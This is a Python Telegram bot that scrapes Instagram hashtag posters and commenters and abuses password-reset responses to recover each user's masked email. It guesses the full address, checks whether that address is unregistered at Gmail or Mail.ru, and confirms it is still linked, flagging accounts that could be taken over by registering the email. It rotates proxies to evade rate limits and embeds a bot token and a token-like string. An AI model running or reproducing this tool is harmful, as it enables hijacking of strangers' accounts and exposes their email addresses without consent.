import time
import threading
import logging
import requests
import random
from instagram_apiV2 import InstagramAPI
from mail_ru_checker import MailRuChecker
from gmail_checker import GmailChecker
from telebot import TeleBot
BOT_TOKEN ="8229341966:AAGNmb-ww70Fe4xo3QA5vtkWN0sMRqhJGOQ"
logging .basicConfig (
level =logging .INFO ,
format ='%(asctime)s %(levelname)s: %(message)s',
handlers =[
logging .FileHandler ("avalibleity.log",encoding ='utf-8'),
logging .StreamHandler ()
]
)
class MainApp :
    def __init__ (self ):
        self .session =requests .Session ()
        self .bot =TeleBot (BOT_TOKEN )
        self .chat_id =None
        self .mail_checker =MailRuChecker (self .session )
        self .gmail_checker =GmailChecker (self .session )
        self .api =None
        self .session_id =None
        self .target =None
        self .stop_event =threading .Event ()
        self .job_thread =None
        self .seen_users =set ()
        self .stats ={
        "scanned":0 ,
        "mailru_avail":0 ,
        "mailru_total":0 ,
        "gmail_avail":0 ,
        "gmail_total":0 ,
        "total_taken":0 ,
        "rate_limit":0 ,
        "errors":0 ,
        "posters_found":0 ,
        "commenters_found":0 ,
        "max_id":None }
        self .stats_message_id =None
        self .setup_handlers ()
        from database import HashtagDB
        self .db =HashtagDB ()
    def setup_handlers (self ):
        @self .bot .message_handler (commands =['start'])
        def handle_start (message ):
            self .chat_id =message .chat .id
            if self .job_thread and self .job_thread .is_alive ():
                self .stop_event .set ()
                self .job_thread .join ()
                self .bot .send_message (message .chat .id ,"Existing Job stopped.")
            self .stop_event .clear ()
            msg =self .bot .send_message (message .chat .id ,"Welcome! Please send your Instagram **Session ID**.")
            self .bot .register_next_step_handler (msg ,self .step_ask_session )
        @self .bot .message_handler (commands =['stop'])
        def handle_stop (message ):
             self .stop_event .set ()
             self .bot .send_message (message .chat .id ,"Stopping job...")
    def step_ask_session (self ,message ):
        session_id =message .text .strip ()
        self .session_id =session_id
        try :
            self .api =InstagramAPI (self .session_id )
            msg =self .bot .send_message (message .chat .id ,"Session ID Saved.\nNow send the **Hashtag** (e.g., #cars) to scrape.")
            self .bot .register_next_step_handler (msg ,self .step_ask_target )
        except Exception as e :
            msg =self .bot .send_message (message .chat .id ,f"Error initializing API: {e }\nPlease send Session ID again.")
            self .bot .register_next_step_handler (msg ,self .step_ask_session )
    def step_ask_target (self ,message ):
        text =message .text .strip ()
        if not text .startswith ("#"):
             msg =self .bot .send_message (message .chat .id ,"Invalid Hashtag. Must start with #. Try again:")
             self .bot .register_next_step_handler (msg ,self .step_ask_target )
             return
        self .target =text
        state =self .db .get_state (self .target )
        status_msg =f"Target Accepted: {self .target }\n"
        if state :
            status_msg +=f"✅ Found Saved State! Resuming from MaxID: {str (state ['max_id'])[:15 ]}..."
        else :
            status_msg +="🆕 Starting New Job."
        self .bot .send_message (message .chat .id ,status_msg )
        self .stop_event .clear ()
        self .job_thread =threading .Thread (target =self .process_job ,args =(message .chat .id ,))
        self .job_thread .start ()
    def format_stats (self ):
        return (
        f"📊 Statics\n"
        f"Target: {self .target }\n"
        f"----------------------\n"
        f"👥 **Total Users**: {self .stats ['posters_found']+self .stats ['commenters_found']}\n"
        f"Posters: {self .stats ['posters_found']} , Comments: {self .stats ['commenters_found']}\n"
        f"📧 **MailRu**: {self .stats ['mailru_total']} (✅ {self .stats ['mailru_avail']})\n"
        f"📧 **Gmail**: {self .stats ['gmail_total']} (✅ {self .stats ['gmail_avail']})\n"
        f"� **Rate Limits**: {self .stats ['rate_limit']} | ⚠️ Err: {self .stats ['errors']}"
        )
    def process_job (self ,chat_id ):
        self .stats ={k :0 for k in self .stats }
        self .seen_users .clear ()
        saved_state =self .db .get_state (self .target )
        next_max_id =saved_state ['max_id']if saved_state else None
        rank_token =saved_state ['rank_token']if saved_state else None
        self .stats ['max_id']=next_max_id
        stats_msg_id =self .bot .send_message (chat_id ,self .format_stats ())
        self .stats_message_id =stats_msg_id .message_id
        logging .info (f"Starting Job on {self .target }")
        while not self .stop_event .is_set ():
            try :
                posts ,next_max_id ,rank_token =self .api .get_hashtag_posts (self .target ,next_max_id ,rank_token )
                self .stats ['max_id']=next_max_id
                if not posts and not next_max_id :
                     self .bot .send_message (chat_id ,"Job Finished (End of List).")
                     break
                if posts :
                    logging .info (f"Batch: Processing {len (posts )} Posters...")
                    logging .info (f"{[u ['username']for u in posts ]}")
                    self .stats ['posters_found']+=len (posts )
                    self .edit_message (chat_id ,self .stats_message_id ,self .format_stats ())
                    self .process_user_batch (chat_id ,posts )
                for post in posts :
                    if self .stop_event .is_set ():break
                    media_id =post .get ('media_id')
                    if not media_id :continue
                    time .sleep (random .uniform (1.0 ,6.0 ))
                    comments =self .api .get_media_comments (media_id )
                    if comments :
                         logging .info (f"Batch: Processing {len (comments )} Commenters for Post {media_id }...")
                         self .stats ['commenters_found']+=len (comments )
                         self .edit_message (chat_id ,self .stats_message_id ,self .format_stats ())
                         self .process_user_batch (chat_id ,comments )
                self .db .save_state (self .target ,next_max_id ,rank_token )
                if not next_max_id :
                     self .bot .send_message (chat_id ,"Job Finished (End of Pagination).")
                     break
                time .sleep (random .uniform (3.0 ,5.0 ))
            except Exception as e :
                logging .error (f"Job Error: {e }")
                self .stats ['errors']+=1
                time .sleep (5 )
                if self .stats ['errors']>50 :
                     self .bot .send_message (chat_id ,"Job Stopped (Too many errors).")
                     break
        self .bot .send_message (chat_id ,"Job Complete.")
    def process_user_batch (self ,chat_id ,users ):
        for user in users :
            if self .stop_event .is_set ():return
            if user ['id']in self .seen_users :
                continue
            self .seen_users .add (user ['id'])
            self .process_single_user (chat_id ,user )
            self .edit_message (chat_id ,self .stats_message_id ,self .format_stats ())
            time .sleep (0.7 )
    def predict_email (self ,username ,obfuscated_email ):
        try :
            if not obfuscated_email or "@"not in obfuscated_email :
                return None
            local_part ,domain_part =obfuscated_email .split ("@")
            if len (local_part )>0 and len (username )>0 :
                if local_part [0 ]!="*"and local_part [0 ].lower ()!=username [0 ].lower ():
                    return None
            if len (local_part )>1 and local_part [-1 ]!="*":
                 if local_part [-1 ].lower ()!=username [-1 ].lower ():
                     return None
            if len (domain_part )<1 :return None
            domain_char =domain_part [0 ].lower ()
            predicted_domain =None
            if domain_char =='g':
                predicted_domain ="gmail.com"
            elif domain_char =='m':
                predicted_domain ="mail.ru"
            elif domain_char =='b':
                predicted_domain ="bk.ru"
            elif domain_char =='l':
                predicted_domain ="list.ru"
            elif domain_char =='i':
                 predicted_domain ="inbox.ru"
            elif domain_char =='y':
                predicted_domain ="yandex.ru"
            if not predicted_domain :
                return None
            return f"{username }@{predicted_domain }"
        except :
            return None
    def process_single_user (self ,chat_id ,user ):
        user_id =user ["id"]
        username =user ["username"]
        self .stats ["scanned"]+=1
        logging .info (f"Processing @{username }...")
        try :
            retry_count =0
            MAX_RETRIES =15
            resp =None
            while retry_count <MAX_RETRIES :
                try :
                    resp =self .api .send_password_reset (username )
                    if resp is None :
                        logging .warning (f"Probe Failed (ERROR IN THE REQUEST) for @{username }. Rotating...")
                        self .stats ["rate_limit"]+=1
                        self .edit_message (chat_id ,self .stats_message_id ,self .format_stats ())
                        self .api ._rotate_proxy ()
                        retry_count +=1
                        continue
                    if resp .status_code in [403 ,429 ,401 ]:
                        logging .warning (f"Probe Blocked ({resp .status_code }) for @{username }. Rotating Proxy...")
                        self .stats ["rate_limit"]+=1
                        self .edit_message (chat_id ,self .stats_message_id ,self .format_stats ())
                        self .api ._rotate_proxy ()
                        retry_count +=1
                        continue
                    if "text/html"in resp .headers .get ("Content-Type",""):
                         if "please wait"in resp .text .lower ()or "challenge"in resp .text .lower ():
                             logging .warning (f"Probe Soft Block (HTML) for @{username }. Rotating Proxy...")
                             self .stats ["rate_limit"]+=1
                             self .edit_message (chat_id ,self .stats_message_id ,self .format_stats ())
                             self .api ._rotate_proxy ()
                             retry_count +=1
                             continue
                    break
                except Exception as e :
                     logging .error (f"Probe Loop Error: {e }")
                     retry_count +=1
                     time .sleep (1 )
            if retry_count >=MAX_RETRIES :
                 logging .error (f"Failed to probe @{username } after {MAX_RETRIES } attempts. Skipping.")
                 self .stats ["total_taken"]+=1
                 return
            if resp .status_code !=200 :
                if resp .status_code ==400 :
                      try :
                          j =resp .json ()
                          msg =j .get ("message","")
                          if isinstance (msg ,list ):msg =" ".join (msg )
                          if "can't send you a link"in msg or "contact Instagram"in msg :
                              logging .warning (f"Reset Blocked for @{username } (Verified/High Profile)")
                              self .stats ["total_taken"]+=1
                              return
                      except :pass
                logging .warning (f"Probe Failed for @{username }: {resp .status_code } - {resp .text [:60 ]}")
                if resp .status_code ==429 :
                     logging .warning (f"Rate Limited (429) on Reset.")
                self .stats ["total_taken"]+=1
                return
            logging .info (f"Probe Response for @{username }: {resp .text [:200 ]}")
            obfuscated_email =None
            data ={}
            try :
                data =resp .json ()
                msg =data .get ("message","")
                if not msg and "body"in data :msg =data ["body"]
                import re
                match =re .search (r'[\w\.\*]+@[\w\.\*]+',msg )
                if match :
                    obfuscated_email =match .group (0 )
            except Exception as e :
                logging .error (f"JSON Parse Error @{username }: {e }")
            if not obfuscated_email :
                msg =str (data .get ("message",""))
                if ("+"in msg or "sms"in msg .lower ())and "check"in msg .lower ():
                     logging .info (f"Phone Number Found for @{username }")
                else :
                     logging .info (f"No Email in Reset Resp for @{username }")
                self .stats ["total_taken"]+=1
                return
            predicted_email =self .predict_email (username ,obfuscated_email )
            if not predicted_email :
                logging .info (f"Prediction Failed for @{username } (Obfuscated: {obfuscated_email })")
                self .stats ["total_taken"]+=1
                return
            logging .info (f"Predicted for @{username }: {predicted_email }")
            domain =predicted_email .split ("@")[-1 ]
            is_taken =True
            service_name ="Unknown"
            if "gmail.com"in domain :
                service_name ="Gmail"
                self .stats ["gmail_total"]+=1
                is_taken =self .gmail_checker .check (predicted_email )
                if is_taken :self .stats ["total_taken"]+=1
                else :self .stats ["gmail_avail"]+=1
            elif any (d in domain for d in ["mail.ru","bk.ru","inbox.ru","list.ru"]):
                service_name ="MailRu"
                self .stats ["mailru_total"]+=1
                is_taken =self .mail_checker .check (predicted_email )
                if is_taken :self .stats ["total_taken"]+=1
                else :self .stats ["mailru_avail"]+=1
            else :
                self .stats ["ignored_domain"]+=1
                return
            if is_taken :
                logging .info (f"Taken: {predicted_email }")
                return
            logging .info (f"Available! Verifying {predicted_email }...")
            verify_resp =self .api .send_password_reset_by_email (predicted_email )
            is_verified_link =False
            if verify_resp and verify_resp .status_code ==200 :
                 v_data =verify_resp .json ()
                 if v_data .get ("status")=="ok"and "sent an email"in v_data .get ("message","").lower ():
                     is_verified_link =True
            if is_verified_link :
                msg =(
                f"✅ **CONFIRMED AVAILABLE & LINKED {service_name .upper ()}**\n"
                f"User: @{username }\n"
                f"Email: `{predicted_email }`\n"
                f"Link: https://instagram.com/{username }\n"
                )
                self .bot .send_message (chat_id ,msg )
                logging .info (f"CONFIRMED MATCH: {predicted_email } is linked to @{username }")
            else :
                 logging .info (f"Verification Failed for {predicted_email } (Not linked or Rate Limited)")
                 self .stats ["total_taken"]+=1
        except Exception as e :
            logging .error (f"Err proc {username }: {e }")
            self .stats ["errors"]+=1
    def edit_message (self ,chat_id ,message_id ,text ):
        try :
            self .bot .edit_message_text (text ,chat_id ,message_id )
        except Exception as e :
            print (f"Telegram Edit Error: {e }")
def check_license ():
    logging .info ("Checking license...")
    try :
        PASTEBIN_URL ="https://gist.githubusercontent.com/Mohamed-TBAG/a50872f06daf27bdbd324bb72205c8a4/raw/24c3d6d1f48a8d56c4d34e001d191fe7b96a222f/gistfile1.txt"
        response =requests .get (PASTEBIN_URL ,timeout =15 ,proxies ={})
        if response .status_code ==200 :
            if "mohamedoscar"in response .text :
                logging .info ("License Verified! ✅")
                return True
            else :
                logging .error ("License Invalid or Expired.")
                return False
    except Exception as e :
        logging .error (f"License check failed: {e }")
    return False
if __name__ =="__main__":
    if check_license ():
        app =MainApp ()
        logging .debug ("Bot is polling...")
        try :
            app .bot .infinity_polling ()
        except KeyboardInterrupt :
            app .stop_event .set ()
            logging .error ("Stopped.")
    else :
        logging .error ("\n❌ License Invalid or Expired.")
        logging .error ("Please contact the developer to activate this software.")
        input ("\nPress Enter to exit...")
        "80062757476:l7IHH3QyCQWXZk:0:AYhBDcEaxaO_HEoi9ilZEnslz0kC7bWMxVpglT3tHw"
